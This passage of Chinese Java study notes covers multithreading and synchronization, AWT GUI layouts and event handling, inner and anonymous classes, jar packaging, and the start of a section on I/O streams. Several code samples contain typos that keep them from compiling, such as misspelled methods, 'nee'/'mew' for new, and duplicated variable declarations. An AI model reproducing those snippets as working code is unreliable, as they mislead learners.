aa.start();//A，B交替执行（多线程）\n        //start()的功能：创建一个新的线程，执行run方法里的代码。此时，run方法里的代码与下面代码交替执行\n        //一个Thread对象只能调用一次start方法\n        while(true)\n        {\n            System.out.println(\"BBBB\");\n        }\n    }\n}\n```\n\n创建线程的第二种方式：\n\n1. 定义一个实现了Runnable接口的类(假定为A)\n2. 创建A类对象aa\n3. 利用aa构造一个Thread对象t\n4. 调用t中的start方法\n\n```java\nclass A implements Runnable\n{\n    public void run()\n    {//重写父类的run方法\n        while(true)\n            System.out.println(\"AAAA\");\n    }\n}\npublic class TestThread_2\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n       \tThread t = new Thread(aa);\n        t.start();\n        while(true)\n        {\n            System.out.println(\"BBBB\");\n        }\n    }\n}\n```\n\n## 线程的常用方法\n\n| 常用方法                               | 含义                               |\n| -------------------------------------- | ---------------------------------- |\n| public final void setName(String name) | 设置当前线程的名字                 |\n| public static Thread currentThread()   | 返回对当前正在执行的线程对象的引用 |\n| public final String getName()          | 返回当前线程的名字                 |\n\n```java\nclass A extends Thread\n{\n    public void run()\n    {\n        System.out.printf(\"%s在执行\\n\", Thread.currentThread().getName());\n    }\n}\npublic class TestThread_3\n{\n    public static void main(String[] args)\n    {\n        A aa1 = new A();\n        aa1.setName(\"v5le0n9\");\n        aa1.start();\n        \n        A aa2 = new A();\n        aa2.setName(\"l30n9ry0n\");\n        aa2.start();\n        \n        A aa3 = new A();\n        aa3.setName(\"凉凉\");\n        aa3.start();\n\n        System.out.printf(\"%s在执行\\n\", Thread.currentThread().getName());\n    }\n}\n/**\nl30n9ry0n在执行\n凉凉在执行\nmain在执行\nv5le0n9在执行\n*/\n```\n\n## 线程的控制\n\n| 方法                 | 功能                                                         |\n| -------------------- | ------------------------------------------------------------ |\n| isAlive()            | 判断线程是否还“活”着，即线程是否还未终止                     |\n| getPriority()        | 获得线程的优先级数值                                         |\n| setPriority()        | 设置线程的优先级数值                                         |\n| Thread.sleep()       | 将当前线程睡眠指定毫秒数                                     |\n| join()               | 调用某线程的该方法，将当前线程与该线程“合并”，即等待该线程结束，再恢复当前线程的运行 |\n| yield()              | 让出CPU，当前线程进入就绪队列等待调度                        |\n| wait()               | 当前线程进入对象的wait pool                                  |\n| notify()/notifyAll() | 唤醒对象的wait pool中的一个/所有等待线程                     |\n\n```java\npublic class TestPriority\n{\n    public static void main(String[] args)\n    {\n        Thread t1 = new Thread(new T1());\n        Thread t2 = new Thread(new T2());\n        //最高优先级为10，最低优先级为1，默认优先级为5\n        t1.setPriority(Thread.NORM_PRIORITY + 3);\n        t1.start();\n        t2.start();\n    }\n}\nclass T1 implements Runnable\n{\n    public void run()\n    {\n        for(int i=0; i<100; i++)\n            System.out.println(\"T1: \" + i);\n    }\n}\nclass T2 implements Runnable\n{\n    public void run()\n    {\n        for(int i=0; i<100; i++)\n            System.out.println(\"----T2: \" + i);\n    }\n}\n```\n\n```java\npublic class TestSleep\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        Thread tt = new Thread(aa);\n        tt.start();\n    }\n}\nclass A implements Runnable\n{\n    public void run()\n    {\n        for(int i=0; i<10; i++)\n        {\n            System.out.println(Thread.currentThread().getName() + \" \" + i);\n            try\n            {//sleep会抛异常，是必须要处理的异常，所以要用try...catch语句\n                Thread.sleep(1000);//1000ms=1s\n            }\n            catch(Exception e)\n            {}\n        }\n    }\n}\n```\n\n无论是继承Thread类的run方法还是实现Runnable接口的run方法，都不能抛出任何异常。因为重写方法抛出异常的范围不能大于被重写方法抛出的异常范围。\n\n```java\nclass A implements Runnable\n{\n    public void run()// throws Exception\n    {}\n}\nclass B extends Thread \n{\n    public void run()// throws Exception\n    {}\n}\n```\n\n## 线程的让步\n\n让出CPU，给其它线程执行的机会。让运行中的线程主动放弃当前获得的CPU处理机会，但不是使该线程阻塞，而是使之转入就绪状态。\n\n```java\npublic class TestYield \n{\n    public static void main(String[] args)\n    {\n        MyThread mt = new MyThread();\n        Thread t1 = new Thread(mt);\n        Thread t2 = new Thread(mt);\n        t1.setName(\"线程A\");\n        t2.setName(\"线程B\");\n        t1.start();\n        t2.start();\n    }\n}\nclass MyThread implements Runnable\n{\n    public void run()\n    {\n        for(int i=1; i<=100; i++)\n        {\n            System.out.println(Thread.currentThread().getName() + \": \" + i);\n            if(0 == i%10)\n            {\n                Thread.yield();\n            }\n        }\n    }\n}\n```\n\n## 线程的串行化\n\n```java\npublic class TestJoin\n{\n    public static void main(String[] args)\n    {\n        MyRunner r = new MyRunner();\n        Thread t = new Thread(r);\n        t.start();\n        try\n        {\n            t.join();//暂停当前线程，直到其他线程执行完才继续执行当前线程\n            //在这程序中，执行完子线程再执行主线程\n        }\n        catch(InterruptedException e)\n        {\n            e.printStackTrace();\n        }\n        for(int i=0; i<50; i++)\n            System.out.println(\"主线程：\" + i);\n    }\n}\nclass MyRunner implements Runnable\n{\n    public void run()\n    {\n        for(int i=0; i<50; i++)\n            System.out.println(\"子线程：\" + i);\n    }\n}\n```\n\n## 生命周期控制\n\n```java\npublic class TestShutThread\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        Thread tt = new Thread(aa);\n        tt.start();\n        try\n        {\n            Thread.sleep(1000);\n        }\n        catch(Exception e)\n        {\n            e.printStackTrace();\n        }\n        aa.shutDown();\n    }\n}\nclass A implements Runnable\n{\n    private boolean flag = true;\n    public void run()\n    {\n        while(flag)\n            System.out.println(\"AAAA\");\n    }\n    public void shutDown()\n    {\n        this.flag = false;\n    }\n}\n```\n\n## 线程同步问题产生的原因\n\n假设一个买票程序\n\n```java\nif(票数 > 0)\n{\n    买一张票;\n    票数减一;\n}\n```\n\n当票数只剩一张时，A买了一张票，此时线程切换到B，B显示剩一张票，他也买了一张票。这样就会导致一张票卖给了两个人。\n\n```java\nclass A implements Runnable\n{\n    private static int tickets = 100;//确保aa1和aa2共有100张票\n    public void run()\n    {\n        while(true)\n        {\n            if(tickets > 0)//8行\n            {\n                System.out.printf(\"%s线程正在卖出第%d张票\\n\", Thread.currentThread().getName(), tickets);\n                tickets--;\n            }\n            else\n                break;//14行              \n        }\n    }\n}\npublic class TestTickets\n{\n    public static void main(String[] args)\n    {\n        A aa1 = new A();\n        Thread t1 = new Thread(aa1);\n        t1.start();\n        \n        A aa2 = new A();\n        Thread t2 = new Thread(aa2);\n        t2.start();\n    }\n}\n```\n\n数据库有“事务”的概念，也就是将所有操作放到事务里，这些操作要不就全部执行成功，要不就全部执行失败。推广到上面代码，即将第8行到第14行放到“事务”里。\n\n## 买票程序\n\n### synchronized关键字\n\nsynchronized可以用来修饰一个方法，也可以修饰一个方法内部的某个代码块。\n\n```java\n//synchronized修饰代码块\nsynchronized(类对象名aa)\n{\n    同步代码块\n}\n```\n\n功能：判断aa是否已经被其他线程霸占，如果发现已经被其他线程霸占，则当前线程陷入等待中，如果发现aa没有被其他线程霸占，则当前线程霸占aa对象，并执行同步代码块，在当前线程执行代码块时，其他线程将无法再执行同步代码块，当前线程执行完同步代码块后，会自动释放对aa对象的霸占，此时其他线程会相互竞争对aa的霸占，最后CPU会选择其中的某一个线程执行。\n\n```java\nclass A implements Runnable\n{\n    private int tickets = 100;//static可加可不加，因为都是调用同一个对象\n    public void run()\n    {\n     \twhile(true)\n     \t{\n            synchronized(this)\n            {\n                if(tickets > 0)\n                {\n                    System.out.printf(\"%s线程正在卖出第%d张票\\n\", Thread.currentThread().getName(), tickets);\n                    tickets--;\n                }\n                else\n                    break;   \n            }                \n        }\n    }\n}\npublic class TestTickets_2\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        Thread t1 = new Thread(aa);\n        t1.start();\n        \n        Thread t2 = new Thread(aa);\n        t2.start();\n    }\n}\n```\n\n```java\nclass A extends Thread\n{\n    private static int tickets = 100;//确保aa1和aa2共有100张票\n    private static String str = new String(\"v5le0n9\");\n    public void run()\n    {\n     \twhile(true)\n     \t{\n            synchronized(str)\n            {//不能用this，因为不同对象this不同，也就不能实现同步，所以要在A类固定一个静态的str\n                if(tickets > 0)\n                {\n                    System.out.printf(\"%s线程正在卖出第%d张票\\n\", Thread.currentThread().getName(), tickets);\n                    tickets--;\n                }\n                else\n                    break;   \n            }                \n        }\n    }\n}\npublic class TestTickets_3\n{\n    public static void main(String[] args)\n    {\n        A aa1 = new A();\n        aa1.start();\n        A aa2 = new A();\n        aa2.start();\n    }\n}\n```\n\n```java\nclass A extends Thread\n{\n    private static int tickets = 100;\n    private static String str = new String(\"v5le0n9\");\n    \n    //public synchronized void run()//错误，只有一个站点卖票\n    public void run()\n    {\n        //String str = new String(\"v5le0n9\");//错误，两个站点没有共用局部变量\n        //String str = \"v5le0n9\";//正确，两个str指向同一个数据段地址\n     \twhile(true)\n     \t{\n            synchronized(str)\n            {\n                if(tickets > 0)\n                {\n                    System.out.printf(\"%s线程正在卖出第%d张票\\n\", Thread.currentThread().getName(), tickets);\n                    tickets--;\n                }\n                else\n                    break;   \n            }                \n        }\n    }\n}\npublic class TestTickets_4\n{\n    public static void main(String[] args)\n    {\n        A aa1 = new A();\n        aa1.start();\n        A aa2 = new A();\n        aa2.start();\n    }\n}\n```\n\n## 生产消费\n\n```java\nclass Stack\n{\n    int index = 0;\n    char[] data = new char[6];\n    public void push(char c)\n    {\n        data[index] = c;\n        index++;\n    }\n    public char pop()\n    {\n        index--;\n        return data[index];\n    }\n}\n```\n\n压栈出栈如果不同步会出错。当push执行的时候不能执行pop，反之同理。\n\n```java\nclass SynStack\n{\n    private char[] data = new char[6];\n    private int cnt = 0;//表示数组有效元素的个数\n    public synchronized void push(char ch)\n    {\n        while(cnt == data.length)\n        {\n            try\n            {\n                this.wait();//暂停\n            }\n            catch(Exception e)\n            {}\n        }\n        this.notify();//唤醒\n        data[cnt] = ch;\n        ++cnt;\n        System.out.printf(\"生产线程正在生产第%d个产品，该产品是：%c\\n\", cnt, ch);\n    }\n    public synchronized char pop()\n    {\n        char ch;\n        while(cnt == 0)\n        {\n            try\n            {\n                this.wait();//暂停当前线程\n            }\n            catch(Exception e)\n            {}\n        }\n        this.notify();//唤醒其它wait线程\n        ch = data[cnt-1];\n        System.out.printf(\"---消费线程正在消费第%d个产品，该产品是：%c\\n\", cnt, ch);\n        --cnt;\n        return ch;\n    }\n}\nclass Producer implements Runnable\n{\n    private SynStack ss = null;\n    public Producer(SynStack ss)\n    {\n        this.ss = ss;\n    }\n    public void run()\n    {\n        //push('a');//错误，不能用别的类的方法\n        char ch;\n       \tfor(int i=0; i<20; i++)\n        {\n            ch = (char)('a' + i);\n            ss.push(ch);\n        }\n    }\n}\nclass Consumer implements Runnable\n{\n    private SynStack ss = null;\n    public Consumer(SynStack ss)\n    {\n        this.ss = ss;\n    }\n    public void run()\n    {\n        for(int i=0; i<20; i++)\n        {\n            try\n            {\n                Thread.sleep(200);\n            }\n            catch(Exception e)\n            {}\n            ss.pop();\n        }        \t\n    }\n}\npublic class TestPC\n{\n    public static void main(String[] args)\n    {\n        SynStack ss = new SynStack();\n        Producer p = new Producer(ss);\n        Consumer c = new Consumer(ss);\n        Thread t1 = new Thread(p);\n        t1.start();\n        Thread t2 = new Thread(c);\n        t2.start();\n    }\n}\n```\n\n# awt展望\n\n```java\nimport java.awt.*;\npublic class TestCom\n{//显示绿色窗口\n    public static void main(String[] args)\n    {\n        Frame f = new Frame();\n        f.setSize(400, 400);\n        f.setBackground(Color.GREEN);\n        f.setVisible(true);\n    }\n}\n```\n\n# GUI(图形化用户界面)\n\n## 组件\n\n组件是图形用户界面的基本组成元素，凡是能够以图形化方式显示在屏幕上并能够与用户进行交互的对象均为组件，如菜单、按钮、标签、文本框、滚动条等。\n\n组件分类\n\n- java.awt.Component\n- java.awt.MenuComponent\n\n抽象类java.awt.Component是除菜单相关组件之外所有Java AWT组件类的根父类，该类规定了GUI组件的基本特性，如尺寸、位置和颜色效果等，并实现了作为一个GUI部件所应具备的基本功能。\n\n## 容器\n\n组件通常不能独立地显示出来，必须将组件放在一定的容器中才可以显示出来。\n\n有一类特殊的组件是专门用来包含其他组件的，这类组件叫容器，java.awt.Container是所有容器的父类，java.awt.Container继承自java.awt.Component\n\n容器类对象本身也是一个组件，具有组件的所有性质，但组件不一定是容器。\n\n## Frame常用方法\n\n| 常用方法                                                   | 功能                                                         |\n| ---------------------------------------------------------- | ------------------------------------------------------------ |\n| public void setBounds(int x, int y, int width, int height) | 设置窗体的位置和大小，x和y表示窗体左上角距离屏幕水平和垂直距离，width和height是窗体自身的宽度和高度 |\n| public void setSize(int width, int heigth)                 | 设置窗体的大小，width和height是窗体自身的宽度和高度          |\n| public void setVisible(boolean flag)                       | 设置窗体是否可见，true表示可见。false表示不可见              |\n| public void setBackground(Color c)                         | 设置窗体的背景色                                             |\n\n```java\nimport java.awt.*;\npublic class TestFrame\n{\n    public static void main(String[] args)\n    {\n        Frame f = new Frame(\"v5le0n9\");//标题\n        //Button bn = new Button(\"张三\");//按钮中显示张三\n        //f.add(bn);\n        f.setSize(200, 200);\n        f.setLocation(300, 300);//距离屏幕(x,y)\n        //f.setBounds(300,300,200,200)//相当于上面两个\n        f.setBackground(Color.RED);\n        f.setVisible(true);\n    }\n}\n```\n\n```java\nimport java.awt.Frame;\npublic class TestFrame_2\n{\n    public static void main(String[] args)\n    {\n        Frame f = new Frame(\"v5le0n9\");\n        f.setize(200,200);\n        f.setVisible(true);\n        try\n        {\n            Thread.sleep(2000);\n        }\n        catch(InterruptedException e)\n        {\n            System.out.println(e.getMessage());\n        }\n        f.setLocation(200, 200);\n        try\n        {\n            Thread.sleep(2000);\n        }\n        catch(InterruptedException e)\n        {\n            System.out.println(e.getMessage());\n        }\n        f.setVisible(false);\n    }\n}\n```\n\n```java\nimport java.awt.*;\npublic class TestFrame_3\n{\n    public static void main(String[] args)\n    {\n        MyFrame f1 = MyFrame(100,100,200,200,Color.BLUE);\n        MyFrame f2 = MyFrame(300,100,200,200,Color.YELLOW);\n        MyFrame f3 = MyFrame(100,300,200,200,Color.GREEN);\n        MyFrame f4 = MyFrame(300,300,200,200,Color.MAGENTA);\n    }\n}\nclass MyFrame extends Frame\n{\n    public static int id = 0;\n    MyFrame(int x, int y, int w, int h, Color color)\n    {\n        super(\"MyFrame \" + (id++));\n        setBackground(color);\n        setLayout(null);\n        setBounds(x, y, w, h);\n        setVisible(true);\n    }\n}\n```\n\n## Panel\n\npanel是容纳其他组件的组件，即容器。panel不能单独存在，必须被添加到其他容器中。\n\n```java\nimport java.awt.*;\npublic class TestPanel\n{\n    public static void main(String[] args)\n    {\n        Frame f = new Frame(\"Java Frame with Panel\");\n        Panel p = new Panel();\n        f.setLayout(null);\n        f.setBounds(300,300,500,500);\n        f.setBackground(new Color(100,100,102));\n        p.setBounds(300/2,300/2,500/2,500/2);//相对于父窗口而言\n        p.setBackground(new Color(204,204,255));\n        f.add(p);//p容器要放到f容器中\n        f.setVisible(true);\n    }\n}\n```\n\n## 布局管理器\n\n容器对其中所包含组件的排列方式，包括组件的位置和大小设定，被称为容器的布局(Layout)。\n\n为了使图形用户界面具有良好的平台无关性，Java语言提供了布局管理器来管理容器的布局，而不建议直接设置组件在容器中的位置和尺寸。\n\n每个容器都有一个默认的布局管理器，当容器需要对某个组件进行定位或判断大小尺寸时，就会自动调用其对应的布局管理器。\n\n在AWT中，常见的布局管理器有：\n\n- BorderLayout\n- FlowLayout\n- GridLayout\n\n```java\nimport java.awt.*;\npublic class TestFlowLayout\n{\n    public static void main(String[] args)\n    {\n        Frame f = new Frame(\"Flow Layout\");\n        Button button1 = new Button(\"OK\");\n        Button button2 = new Button(\"Open\");\n        Button button3 = new Button(\"Close\");\n        f.setLayout(new FlowLayout(FlowLayout.CENTER));\n        f.add(button1);\n        f.add(button2);\n        f.add(button3);\n        f.setSize(300,400);\n        f.setVisible(true);\n    }\n}\n```\n\n```java\nimport java.awt.*;\npublic class TestFlowLayout_2\n{\n    public static void main(String[] args)\n    {\n        Frame f = new Frame(\"Java Frame\");\n        FlowLayout l = new FlowLayout(FlowLayout.CENTER, 30, 30);\n        f.setLayout(l);\n        f.setLocation(300,400);\n        f.setSize(300,100);\n        f.setBackgrond(new Color(255,255,255));\n        for(int i=0; i<7; i++)\n        {\n            f.add(new Button(\".BUTTON\"));\n        }\n        f.setVisible(true);\n    }\n}\n```\n\n### BorderLayout\n\nBorderLayout是Frame类的默认布局管理器，将整个容器布局划分成东(EAST)、西(WEST)、南(SOUTH)、北(NORTH)、中(CENTER)。如不指定组件的加入部位，则默认加入到CENTER区。每个区域只能加入一个组件，如果加入多个，则先前加入的会被覆盖。\n\n```java\nimport java.awt.*;\npublic class TestBorderLayout\n{\n    public static void main(String[] args)\n    {\n        Frame f;\n        f = new Frame(\"Border Layout\");\n        Button bn = new Button(\"BN\");\n        Button bs = new Button(\"BS\");\n        Button bw = new Button(\"BW\");\n        Button be = new Button(\"BE\");\n        Button bc = new Button(\"BC\");\n        //f.add(bn, \"North\");//把bn放在北\n        //f.add(bs, \"South\");\n        //f.add(bw, \"West\");\n        //f.add(be, \"East\");\n        //f.add(bc, \"Center\");\n        \n        //更准确的写法\n        f.add(bn, BoderLayout.NORTH);\n        f.add(bs, BoderLayout.SOUTH);\n        f.add(bw, BoderLayout.WEST);\n        f.add(be, BoderLayout.EAST);\n        f.add(bc, BoderLayout.CENTER);\n        \n        f.setSize(200,200);\n        f.setVisible(true);\n    }\n}\n```\n\n### GridLayout\n\nGridLayout型布局管理器将空间划分成规则的矩形网格，每个单元格区域大小相等。组件被添加到每个单元格中，先从左到右添满一行后换行，再从上到下。\n\n在GridLayout构造方法中指定分割的行数和列数，如GridLayout(3,4)。\n\n```java\nimport java.awt.*;\npublic class TestGridLayout\n{\n    public static void main(String[] args)\n    {\n        Frame f = new Frame(\"GridLayout Example\");\n        Button b1 = nee Button(\"b1\");\n        Button b2 = nee Button(\"b2\");\n        Button b3 = nee Button(\"b3\");\n        Button b4 = nee Button(\"b4\");\n        Button b5 = nee Button(\"b5\");\n        f.setLayout(new GridLayout(2,10));//行一定会显示2行，但列数根据行数调整\n        f.add(b1);\n        f.add(b2);\n        f.add(b3);\n        f.add(b4);\n        f.add(b5);\n        f.pack();//如果没有这语句，只显示一个有标题的小窗口\n        f.setVisible(true);\n    }\n}\n```\n\n### 十个按钮的设计\n\n```java\nimport java.awt.*;\npublic class TestGUI\n{\n    public static void main(String[] args)\n    {\n        Frame f = new Frame();\n        f.setSize(400,400);\n        f.setLayout(new GridLayout(2,1));\n        \n        Panel p1 = new Panel();\n        p1.setLayout(new BorderLayout());\n        Panel p1_1 = new Panel();\n        p1_1.setLayout(new GridLayout(2,1));\n        \n        Button bn1 = new Button(\"Button1\");\n        Button bn2 = new Button(\"Button2\");\n        Button bn3 = new Button(\"Button3\");\n        Button bn4 = new Button(\"Button4\");\n        \n        p1.add(bn1, BorderLayout.WEST);\n        p1_1.add(bn3);\n        p1_1.add(bn4);\n        p1.add(p1_1, BorderLayout.CENTER);\n        p1.add(bn2, BorderLayout.EAST);\n        \n        Panel p2 = new Panel();\n        p2.setLayout(new BorderLayout());\n        Panel p2_2 = new Panel();\n        p2_2.setLayout(new GridLayout(2,2));\n        Button bn5 = new Button(\"Button5\");\n        Button bn6 = new Button(\"Button6\");\n        Button bn7 = new Button(\"Button7\");\n        Button bn8 = new Button(\"Button8\");\n        Button bn9 = new Button(\"Button9\");\n        Button bn10 = new Button(\"Button10\");\n        p2.add(bn5, BorderLayout.WEST);\n        p2.add(bn6, BorderLayout.EAST);\n        p2_2.add(bn7);\n        p2_2.add(bn8);\n        p2_2.add(bn9);\n        p2_2.add(bn10);\n        p2.add(p2_2);\n        \n        f.add(p1);\n        f.add(p2);\n        f.pack();\n        f.setVisible(true);\n    }\n}\n```\n\n\n\n## 事件处理\n\n```java\nimport java.awt.*;\nimport java.awt.event.*;\npublic class TestButton\n{\n    public static void main(String[] args)\n    {\n        Frame f = new Frame();\n        Button bn = mew Button(\"OK\");//事件源\n        f.add(bn);\n        A aa = new A();//事件监听器\n        bn.addActionListener(aa);//鼠标单击OK在黑窗口显示hello world!\n        f.pack();\n        f.addWindowListerner(new B());//点程序的×就可以关闭程序\n        f.setVisible(true);\n    }\n}\nclass B extends WindowAdapter //implements WindowListener//这个里面有很多抽象类，所以必须要重写所有的抽象类才能是普通类，否则B需定义为抽象类。而WindowAdapter只需重写需要的\n{\n    public void windowClosing(WindowEvent e)\n    {\n        System.exit(-1);\n    }\n}\nclass A implements ActionListener\n{\n    public void actionPerformed(ActionEvent e)\n    {//方法重写\n        System.out.println(\"hello world!\");\n        //System.exit(-1);//退出程序\n    }\n}\n```\n\n默认情况下事件源不会自动产生任何事件，程序员需要做两件事：\n\n1. 告诉事件源可以自动产生哪类事件，即向事件源注册某种事件的事件监听器对象\n2. 设计好可以处理这种事件的事件监听器\n\n一旦完成这两步操作，当用户对事件源进行操作时。事件源就会自动产生事件，事件源就会自动把产生的事件封装成一个事件对象，事件源就会自动把封装好的事件对象传递给事件监听器。\n\n事件监听器收到事件源发送过来的事件时，事件监听器就会自动调用相应的事件处理方法来对该事件进行相应的处理。\n\n### 事件种类\n\njava.awt.event包中含有所有的事件，常用的事件有：\n\n- ActionEvent：激活组件时发生的事件\n- KeyEvent：操作键盘时发生\n- MouseEvent：操作鼠标时发生\n- WindowEvent：操作窗口时发生的事件，如最大化或最小化某一窗口\n\n一个事件源会产生哪些事件，一般第三方软件会自动显示，不需要特地记忆。\n\n## 三个文本框相加运算\n\n```java\nimport java.awt.*;\nimport java.awt.event.*;\npublic class TestTextField\n{\n    public static TextField tf1, tf2, tf3;//MyMonitor类需要调用这几个属性，所以不能写在main里\n    public static void main(String[] args)\n    {\n        tf1 = new TextField(30);\n        tf2 = new TextField(30);\n        tf3 = new TextField(30);\n        Button bn = new Button(\"=\");\n        Label lb = new Label(\"+\");\n        Frame f = new Frame(\"文本框相加示例\");\n        f.setLayout(new FlowLayout());\n        f.add(tf1);\n        f.add(lb);\n        f.add(tf2);\n        f.add(bn);\n        f.add(tf3);\n        bn.addActionListener(new MyMonitor());\n        f.pack();\n        f.setVisible(true);\n    }\n}\nclass MyMonitor implements ActionListener\n{\n    @Override//用法看下个例子\n    public void actionPerformed(ActionEvent e)\n    {\n        String str1 = TestTextField.tf1.getText();\n        String str2 = TestTextField.tf2.getText();\n        int num1 = Integer.parseInt(str1);\n        int num2 = Integer.parseInt(str2);\n        int num3 = num1 + num2;\n        \n        //第一种方法\n        Integer it = new Integer(num3);\n        String str3 = it.toString();\n        TestTextField.tf3.setText(str3);\n        \n        //第二种方法\n        String str3 = num3 + \"\";\n        TestTextField.tf3.setText(str3);\n        \n        //第三种方法\n        String str3 = Integer.toString(num3);//整型以字符串输出\n        TestTextField.tf3.setText(str3);\n        \n        //第四种方法\n        String str3 = String.ValueOf(num3);\n        TestTextField.tf3.setText(str3);\n    }\n}\n```\n\n```java\nclass A\n{\n\tpublic void dsvdknslsvjfnhvfbcj()\n    {\n        System.out.println(\"AAAA\");\n    }\n}\nclass B extends A\n{\n    @Override//这个提示下面的方法是重写父类的方法，如果不是重写父类的方法则会提示有错\n    public void dsvdknslsvjfnhvfbcj()\n    {\n        System.out.println(\"BBBB\");\n    }\n}\npublic class TestOverride\n{\n    public static void main(String[] args)\n    {\n        A aa = new B();//父类创建一个子类对象\n        aa.dsvdknslsvjfnhvfbcj();//输出BBBB\n    }\n}\n```\n\n```java\nimport java.awt.*;\nimport java.awt.event.*;\npublic class TestTextField_2\n{//改良版\n    public static void main(String[] args)\n    {\n        new TF().launch();\n    }\n}\nclass TF\n{\n    public TextField tf1, tf2, tf3;\n    public void launch()\n    {\n        tf1 = new TextField(30);\n        tf2 = new TextField(30);\n        tf3 = new TextField(30);\n        Button bn = new Button(\"=\");\n        Label lb = new Label(\"+\");\n        Frame f = new Frame(\"文本框相加示例\");\n        f.setLayout(new FlowLayout());\n        f.add(tf1);\n        f.add(lb);\n        f.add(tf2);\n        f.add(bn);\n        f.add(tf3);\n        bn.addActionListener(new MyMonitor(this));\n        f.pack();\n        f.setVisible(true);\n    }\n}\nclass MyMonitor implements ActionListener\n{\n    private TF tf;\n    public MyMonitor(TF tf)\n    {\n        this.tf = tf;\n    }\n    @Override\n    public void actionPerformed(ActionEvent e)\n    {\n        String str1 = tf.tf1.getText();\n        String str2 = tf.tf2.getText();\n        int num1 = Integer.parseInt(str1);\n        int num2 = Integer.parseInt(str2);\n        int num3 = num1 + num2;\n\n        String str3 = num3 + \"\";\n        tf.tf3.setText(str3);\n    }\n}\n```\n\n```java\nimport java.awt.*;\nimport java.awt.event.*;\npublic class TestTextField_3\n{//再次改良版内部类\n    public static void main(String[] args)\n    {\n        new TF().launch();\n    }\n}\nclass TF\n{\n    private TextField tf1, tf2, tf3;\n    public void launch()\n    {\n        tf1 = new TextField(30);\n        tf2 = new TextField(30);\n        tf3 = new TextField(30);\n        Button bn = new Button(\"=\");\n        Label lb = new Label(\"+\");\n        Frame f = new Frame(\"文本框相加示例\");\n        f.setLayout(new FlowLayout());\n        f.add(tf1);\n        f.add(lb);\n        f.add(tf2);\n        f.add(bn);\n        f.add(tf3);\n        bn.addActionListener(new MyMonitor());\n        f.pack();\n        f.setVisible(true);\n    }\n    \n    class MyMonitor implements ActionListener\n    {\n        @Override\n        public void actionPerformed(ActionEvent e)\n        {\n            String str1 = tf1.getText();\n            String str2 = tf2.getText();\n            int num1 = Integer.parseInt(str1);\n            int num2 = Integer.parseInt(str2);\n            int num3 = num1 + num2;\n            String str3 = num3 + \"\";\n            tf3.setText(str3);\n        }\n    }\n}\n```\n\n### 内部类\n\n内部类定义：在A类的内部但是所有方法的外部定义了一个B类，则B类就是A类的内部类，A是B的外部类。\n\n内部类的方法可以访问外部类所有成员，外部类的方法不可以直接访问内部类的成员。\n\n内部类的优点：①可以让一个类方便地访问另一类中的所有成员；②增加程序的安全性，有效避免其他部相关类对该类的访问。\n\n### 匿名类\n\n匿名类是一种特殊的内部类。如果在一个方法内部定义了一个匿名类，则该匿名类可以访问：①外部类的所有成员；②包裹该匿名类的方法中的所有final类型的局部变量，非final类型的局部变量无法被匿名类访问。\n\n创建匿名类的三种方式：继承父类、实现接口、实现抽象类。\n\n#### 创建匿名类之实现接口\n\n假设A是接口名，格式：\n\n```java\nnew A()\n{\n    //实现接口中方法的代码\n};\n```\n\n生成一个实现了A接口的匿名类对象。\n\n#### 创建匿名类之实现抽象类\n\n假设A是抽象类，格式：\n\n```java\nnew A()\n{\n    //实现了A类的所有抽象类的方法代码\n    //添加自己的方法或属性代码(不建议，没有实际意义)\n}\n```\n\n生成一个匿名类，该匿名类必须得实现了A类的所有抽象方法，当然该匿名类也可以定义自己的属性和方法。\n\n#### 创建匿名类之继承父类\n\n假设A是个类名，格式：\n\n```java\nnew A()\n{\n    //重写了A类的方法代码\n    //添加自己的属性和方法(不建议，没有实际意义)\n}\n```\n\n生成一个A类的子类对象，该匿名类对象继承了A的所有非private成员。\n\n```java\nimport java.awt.*;\nimport java.awt.event.*;\npublic class TestWindow\n{\n    public static void main(String[] args)\n    {\n        Frame f = new Frame();\n        f.setSize(300,300);\n        f.addWindowListener(\n        \tnew WindowAdapter()\n            {//匿名类\n                @Override\n                public void windowClosing(WindiwEvent e)\n                {\n                    //f.setVisible(false);//错误，如果final Frame f = new Frame();才对\n                    System.exit(-1);\n                }\n            }\n        );\n        f.setVisible(true);\n    }\n}\n```\n\n## 可运行jar包生成步骤\n\n1. 新建一个记事本文件，假设为1.txt，文件内容：\n\n- Main-Class: 可运行类的名字(启动类的名字)\n- 附注：记得敲回车\n\n2. dos下命令：\n\n- ```\n  jar cvfm haha.jar 1.txt *.class\n  ```\n\n注意：只有GUI程序生成的class文件才可以作为main class\n\n# 流\n\n```java\nimport java.io.*;\npublic class TestFileReader\n{\n    public static void main(String[] args) throws Exception\n    {\n        FileReader fr = new FileReader(\"D:\\\\Java\\\\TestFileReader.java\");//某个文件路径\n        int ch;\n        int cnt = 0;\n        ch = fr.read();//从文件读取字符编码，用整型变量存储\n        while(-1 != ch)\n        {\n            ++cnt;\n            System.out.printf(\"%c\",(char)ch);\n            ch = fr.read();\n        }\n        System.out.printf(\"该文件字符的个数是%d\\n\", cnt);\n        fr.close();\n    }\n}\n```\n\n```java\nimport java.io.*;\npublic class TestFileInputStream\n{\n    public static void main(String[] args) throws Exception\n    {\n        FileInputStream fis = new FileInputStream(\"D:\\\\Java\\\\TestFileReader.java\");\n        int ch;\n        int cnt = 0;\n        ch = fis.read();\n        while(-1 != ch)\n        {\n            ++cnt;\n            System.out.printf(\"%c\",(char)ch);\n            ch = fis.read();\n        }\n        System.out.printf(\"该文件字节的个数是%d\\n\", cnt);//汉字显示乱码，因为汉字占两个字节\n        fis.close();\n    }\n}\n```\n\n流就是程序和设备之间嫁接起来的一根用于数据传输的管道，这个管道上有很多按钮，不同的按钮可以实现不同的功能。这根带按钮的用于数据传输的管道就是流。\n\n## 流的分类\n\njava.io包中定义了多个流类型(类或抽象类)来实现输入/输出功能，可以从不同的角度对其进行分类：\n\n- 按数据流的方向不同可以分为输入流和输出流\n- 按处理数据单位不同可以分为多字节流和字符流\n- 按照功能不同可以分为节点流和处理流\n\nJ2SDK所提供的所有流类型位于包java.io内部分别继承自以下四种抽象流类型：\n\n|        | 字节流       | 字符流 |\n| ------ | ------------ | ------ |\n| 输入流 | InputStream  | Reader |\n| 输出流 | OutputStream | Writer |\n\n## 四大基本流\n\n### InputStream\n\n```java\npublic int read() throws IOException\n```\n\n读取一个字节并以整数形式返回，如果读取到输入流的末尾则返回-1。\n\n```java\npublic int read(byte[] b) throws 